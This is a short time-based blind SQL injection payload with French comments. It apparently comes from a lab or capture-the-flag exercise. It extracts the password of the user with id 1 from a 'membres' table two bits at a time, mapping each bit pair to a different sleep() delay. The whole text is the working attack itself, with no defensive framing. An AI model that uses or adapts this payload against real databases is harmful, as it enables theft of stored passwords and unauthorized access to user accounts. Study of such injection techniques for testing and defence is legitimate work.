SC,(select (
    case 
    field(
        concat(
            substring(bin(ascii(substring(password,1,1))),1,1),     -- 1er bit de la valeur de bin(ascii(premier caractère du mdp))
            substring(bin(ascii(substring(password,1,1))),2,1)      -- 2e bit de la valeur de bin(ascii(premier caractère du mdp))
            ),
        00,
        01,
        10,
        11)
    when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) 
from membres where id=1)